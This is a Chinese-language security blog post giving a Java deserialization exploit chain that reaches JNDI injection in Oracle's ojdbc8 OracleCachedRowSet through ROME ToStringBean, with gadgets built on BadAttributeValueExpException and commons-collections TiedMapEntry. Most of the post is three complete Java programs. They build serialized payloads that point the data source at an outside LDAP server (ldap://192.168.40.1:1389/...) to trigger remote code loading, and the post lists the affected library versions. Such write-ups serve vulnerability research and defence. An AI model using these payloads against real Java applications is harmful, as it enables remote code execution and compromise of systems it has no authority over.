---
layout: post
date: 2025-11-24
title: "oracle-Jndi注入-反序列化链"
author: "XinYiSleep"
category: Java
---
<h1 id="JMoFo">一.基础信息</h1>

```
这个链是参考的unam4师傅的文章，首先需要用到的包分别是<=rome1.11.1	 <=ojdbc819.17.0.0，其中除了原生的gedget还会用到commons-collections
没错cc的链不限制版本。
```

```java
<dependency>
        <groupId>com.oracle.database.jdbc</groupId>
        <artifactId>ojdbc8</artifactId>
        <version>19.17.0.0</version>
</dependency>

<dependency>
    <groupId>com.rometools</groupId>
    <artifactId>rome</artifactId>
    <version>1.11.1</version>
</dependency>

<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

```java
堆栈--原生BadAttributeValueExpException执行ToString

    BadAttributeValueExpException.readObject()
        BadAttributeValueExpException.toString()
            ToStringBean.toString()(Public)
                ToStringBean.toString()(private)
                    OracleCachedRowSet.getConnection()
                        OracleCachedRowSet.getConnectionInternal()

堆栈--原生UIDefaults$TextAndMnemonicHashMap执行ToString

    HashMap.readObject()
        HashMap.hash()
            TiedMapEntry.hashCode()
                TiedMapEntry.hashCode()
                    TiedMapEntry.getValue()
                        UIDefaults$TextAndMnemonicHashMap.get()
                            ToStringBean.toString()(Public)
                                ToStringBean.toString()(private)
                                    OracleCachedRowSet.getConnection()
                                        OracleCachedRowSet.getConnectionInternal()
```

<h1 id="DeCiW">二.oracleJNDI尾链</h1>

```
这个链最终原因是因为oracle存在JNDI注入导致的，oracle.jdbc.rowset.OracleCachedRowSet#
getConnectionInternal图一，161行很明显的进行了JNDI注入其中this.getDataSourceName()在其父类中可控，
那么刚好在上面getConnection中存在调用getConnectionInternal，看到这里根据以前学的知识很快想到了用过Getter执行，首先先打一下jndi图二代码一。

```

![](https://xinyisleep.github.io/img/2025/oracle/1.png)

![](https://xinyisleep.github.io/img/2025/oracle/2.png)

```java
import oracle.jdbc.rowset.OracleCachedRowSet;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

public class Main12345 {
    public static void main(String[] args) throws Exception {
        Class<?> aClass = Class.forName("oracle.jdbc.rowset.OracleCachedRowSet");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor();
        declaredConstructor.setAccessible(true);
        OracleCachedRowSet o = (OracleCachedRowSet)declaredConstructor.newInstance();
        Method declaredMethod = aClass.getDeclaredMethod("setDataSourceName", String.class);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(o, "ldap://192.168.40.1:1389/ai2tnm");
        o.getConnection();
    }
}

```

<h1 id="aEaTY">三.BadAttributeValueExpException原生链</h1>

```
上面我们得知了现在需要getConnection，那么就需要用到rome,这里我就细讲了，可以看历史文章，
这个链相当简单的，唯一需要注意的就是在之心getter的时候会先执行到getOriginal需要修改参数不等于空就可以了payload代码一
```

```java

import com.rometools.rome.feed.impl.ToStringBean;
import oracle.jdbc.rowset.OracleCachedRowSet;
import oracle.jdbc.rowset.OracleRowSetMetaData;

import javax.management.BadAttributeValueExpException;
import javax.sql.RowSetInternal;
import javax.sql.rowset.RowSetMetaDataImpl;
import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.sql.SQLException;

public class Main123 {
    public static void main(String[] args) throws Exception {

        //反射修改属性值进行JNDI注入
        Class<?> aClass = Class.forName("oracle.jdbc.rowset.OracleCachedRowSet");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor();
        declaredConstructor.setAccessible(true);
        OracleCachedRowSet o = (OracleCachedRowSet)declaredConstructor.newInstance();

        Method declaredMethod = aClass.getDeclaredMethod("setDataSourceName", String.class);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(o, "ldap://192.168.40.1:1389/ai2tnm");

        //因为通过Getter触发所以先执行了getOriginal才会执行getConnection,所以修改setMetaData不是空
        Class<?> aClass1 = Class.forName("javax.sql.rowset.RowSetMetaDataImpl");
        Constructor<?> declaredConstructor1 = aClass1.getDeclaredConstructor();
        declaredConstructor1.setAccessible(true);
        RowSetMetaDataImpl o1 =(RowSetMetaDataImpl)declaredConstructor1.newInstance();
        o.setMetaData(o1);

        //通过ToStringBean执行toString触发getter方法
        ToStringBean toStringBean = new ToStringBean(RowSetInternal.class, o);
        //通过BadAttributeValueExpException执行getter触发toString
        BadAttributeValueExpException badAttr = new BadAttributeValueExpException(null);
        Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(badAttr, toStringBean);
        serialize(badAttr);
        unserialize("ser.bin");

    }
    public static void serialize(Object obj) throws Exception {
        //序列化
        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);

    }
    public static Object unserialize(String name) throws Exception {
        //反序列化
        ObjectInputStream ois= new ObjectInputStream(new FileInputStream(name));
        Object o = ois.readObject();
        return o;
    }
}

```

<h1 id="RrsSp">四:UIDefaults$TextAndMnemonicHashMap非原生链</h1>

```
本质就是通过调用ToString之后，在通过cc链TiedMapEntry.getValue调用get接着同类中hashCode调用了 getValue，HashMap执行了hashCode，
就是dns的链大差不差，不懂的话我都有注释代码一。
```

```java

import com.rometools.rome.feed.impl.ToStringBean;
import oracle.jdbc.rowset.OracleCachedRowSet;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

import javax.management.BadAttributeValueExpException;
import javax.sql.RowSetInternal;
import javax.sql.rowset.RowSetMetaDataImpl;
import javax.swing.*;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class Main1234 {
    public static void main(String[] args) throws Exception {

        Class<?> aClass = Class.forName("oracle.jdbc.rowset.OracleCachedRowSet");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor();
        declaredConstructor.setAccessible(true);
        OracleCachedRowSet o = (OracleCachedRowSet)declaredConstructor.newInstance();

        Method declaredMethod = aClass.getDeclaredMethod("setDataSourceName", String.class);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(o, "ldap://192.168.40.1:1389/ai2tnm");

        Class<?> aClass1 = Class.forName("javax.sql.rowset.RowSetMetaDataImpl");
        Constructor<?> declaredConstructor1 = aClass1.getDeclaredConstructor();
        declaredConstructor1.setAccessible(true);
        RowSetMetaDataImpl o1 =(RowSetMetaDataImpl)declaredConstructor1.newInstance();
        o.setMetaData(o1);

        //通过toString触发getter
        ToStringBean toStringBean = new ToStringBean(RowSetInternal.class, o);

        //通过get触发toString
        Class<?> aClass2 = Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Constructor<?> declaredConstructor2 = aClass2.getDeclaredConstructor();
        declaredConstructor2.setAccessible(true);
        HashMap o2 = (HashMap)declaredConstructor2.newInstance();

        //创建TiedMapEntry实例,通过getValue触发get,再通过hashCode触发getValue
        Class<?> aClass3 = Class.forName("org.apache.commons.collections.keyvalue.TiedMapEntry");
        Constructor<?> declaredConstructor3 = aClass3.getDeclaredConstructor(Map.class, Object.class);
        declaredConstructor3.setAccessible(true);
        TiedMapEntry o3 = (TiedMapEntry)declaredConstructor3.newInstance(o2, toStringBean);

        //put触发hashCode,再通过反射修改put的值
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
        objectObjectHashMap.put("XinYiSec","XinYiSec");

        Field tableField = HashMap.class.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] table = (Object[]) tableField.get(objectObjectHashMap);

        for (Object entry : table) {
            if (entry != null) {
                Field keyField = entry.getClass().getDeclaredField("key");
                keyField.setAccessible(true);
                keyField.set(entry, o3);
                break;
            }
        }
        serialize(objectObjectHashMap);
        unserialize("ser.bin");

    }
    public static void serialize(Object obj) throws Exception {
        //序列化
        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);

    }
    public static Object unserialize(String name) throws Exception {
        //反序列化
        ObjectInputStream ois= new ObjectInputStream(new FileInputStream(name));
        Object o = ois.readObject();
        return o;
    }
}

```

